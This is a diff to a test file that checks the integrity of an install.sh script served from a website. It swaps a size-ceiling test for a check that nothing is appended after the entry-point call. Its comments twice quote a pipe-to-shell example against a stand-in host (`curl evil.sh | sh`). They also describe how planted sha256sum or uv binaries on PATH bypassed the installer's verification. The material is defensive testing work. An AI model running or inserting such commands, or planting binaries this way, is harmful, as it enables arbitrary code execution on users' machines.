@@ -302,8 +302,10 @@ describe("body integrity — install.sh shape and bounded size (H-08)", () => {
   //   (b) Shape (shebang + Worthless marker) — the served bytes are at
   //       least syntactically the install script (catches truncation /
   //       null body returned with 200).
-  //   (c) Size CEILING — corruption / appended payload. Surgical 50-byte
-  //       appends caught by the 20 KB tight ceiling, not the 100 KB upper.
+  //   (c) Size CEILING (100 KB) — gross corruption. Surgical appends are
+  //       caught by (a) here and, in production, by the deploy-time and hourly
+  //       sha256 checks (deploy-worker.yml, served-installer-integrity.yml),
+  //       plus the "last line is the entry-point call" check below.
   // The shape and size assertions are intentionally kept after byte-equality
   // landed — they pinpoint truncation vs substitution as different bugs.
   // WOR-323 promoted byte-equality from the original "Phase 3 will add this"
@@ -338,81 +340,29 @@ describe("body integrity — install.sh shape and bounded size (H-08)", () => {
     });
     expect(res.status).toBe(200);
     const body = await res.text();
-    // install.sh is ~12 KB. 100 KB ceiling = 8× headroom. Anything bigger is
-    // a smoking gun for template injection or appended attacker payload.
+    // Gross-corruption bound only. install.sh is ~31 KB; anything near 100 KB
+    // is template injection or a mangled build, not a code change.
     expect(body.length).toBeLessThan(100_000);
   });
 
-  it("install-script body is bounded — under 24.5 KB tight ceiling (surgical injection guard)", async () => {
-    // Per pen-tester Batch-3 review: 100 KB ceiling above is the corruption
-    // guard, but a surgical 50-byte append (`; curl evil.sh | sh`) wouldn't
-    // trip it. Pin a tight ceiling near install.sh's actual size — any
-    // appended payload large enough to matter is caught here. The 100 KB
-    // test stays as the corruption upper bound.
-    //
-    // Ceiling history:
-    //   - Pre-Tier A: install.sh was ~12 KB. 20 KB ceiling = ~8 KB slack.
-    //   - Post-WOR-673 (A2 env scrub + PATH lockdown): install.sh is ~23 KB.
-    //     48-var unset block (11 attack classes) + PATH defense + honest
-    //     proxy_hints + threat-model comments add ~11 KB of substantive
-    //     security content. Ceiling at 24.5 KB keeps ~1.3 KB slack — tight,
-    //     intentionally. Each future bump must cite the WOR ticket that
-    //     justifies the growth and be a real discussion, not a ratchet.
-    //   - Bumped 24.5 KB -> 26.4 KB for worthless-rlio + worthless-v0tl. This is
-    //     the "real discussion" the line above asks for, so here it is.
-    //
-    //     Both were exploitable. The PATH lockdown outranks the caller only for
-    //     commands that EXIST in the trusted dirs, and it keeps the caller's PATH
-    //     as the tail by design. `sha256sum` is in none of those dirs on macOS and
-    //     `uv` is in none of them anywhere, so `command -v` for either reached an
-    //     attacker's directory. A planted sha256sum returned the expected constant
-    //     and a tampered Astral installer passed verification and was executed; a
-    //     planted uv reported the pinned version and skipped the download and the
-    //     SHA check entirely. Both confirmed on a real Mac.
-    //
-    //     The fix is two resolver helpers that search an explicit list and never
-    //     fall back to PATH: ~900 chars of code plus the comment explaining why.
-    //     It could not be made smaller without deleting the reasoning, and this
-    //     ceiling exists to stop injected code hiding in bloat — not to stop the
-    //     script defending itself. Shrinking the script by removing a security
-    //     control to satisfy a guard against insecurity would invert its purpose.
-    //
-    //     Script is 25980 chars; slack after the bump is 420: still tight,
-    //     still not a ratchet.
-    //   - Bumped 26.4 KB -> 26.8 KB for worthless-mb6l. Baseline on main was
-    //     26385 of 26400 — 15 chars of headroom, so this fix could not fit at
-    //     any size. The fix is 218 chars: the idempotency fast-path must require
-    //     the entry point to EXIST, not merely for a version string to match.
-    //
-    //     Why it cannot be dropped or shrunk further: uv writes its tool receipt
-    //     before the environment is complete, so an interrupted install leaves
-    //     `uv tool list` reporting the right version for a tool that does not
-    //     run. The fast-path then skips the --force reinstall that would repair
-    //     it — and does so on EVERY subsequent run, so re-running the installer,
-    //     which is what the error message implies, can never fix it. The user is
-    //     stuck until they know to `uv tool uninstall worthless`.
-    //
-    //     Already minimised: the condition is inlined rather than using a
-    //     variable, and the rationale lives in the test docstring
-    //     (test_install_logic.py::test_a_half_finished_install_repairs_itself_on_the_next_run)
-    //     rather than in the script, which is the pattern PR #573 and #582 set.
-    //     What remains is the condition itself plus two comment lines.
-    //
-    //     Script is 26603 chars; slack after the bump is 197. Tighter than the
-    //     last bump left it. The next one needs its own argument, and at this
-    //     rate the honest next step is splitting the served script rather than
-    //     raising this again.
-    //     The next bump needs its own argument.
+  it("install-script body's last line is the entry-point call (no appended lines)", async () => {
+    // Replaces a tight SIZE ceiling (24.5 KB, raised four times to 31 KB) that was
+    // meant to catch a surgical append such as `; curl evil.sh | sh`. A size cap
+    // can't: the file is ~44% comments, so an attacker trims 60 bytes of comment
+    // and appends at the same size, and the cap kept blocking honest fixes
+    // instead. What the served bytes must equal is pinned by byte-equality above
+    // (and in production by the deploy-time and hourly sha256 checks). This pins
+    // the narrow property the ceiling was standing in for: no line is appended
+    // after `main "$@"`. It does NOT stop code inserted ABOVE main (a new EXIT
+    // trap, an edited cleanup() or main()) — that is caught only by review and by
+    // byte-equality against the release tag.
     const res = await SELF.fetch("https://worthless.sh/", {
       headers: { "user-agent": CURL_UA },
     });
     expect(res.status).toBe(200);
     const body = await res.text();
-    //   - WOR-597 (shadow warning): cap raised to 31 KB; the redesign then shrank
-    //     the script to ~29.8 KB. body.length is the file's UTF-16 length (served
-    //     unchanged), and the slack is the surgical-append detection threshold --
-    //     re-measure it, don't trust a number here. worthless-oo6q: report slack.
-    expect(body.length).toBeLessThan(31_000);
+    const lines = body.split("\n").filter((l) => l.trim() !== "");
+    expect(lines[lines.length - 1]).toBe('main "$@"');
   });
 
   it("install-script body Content-Length header matches actual byte length", async () => {
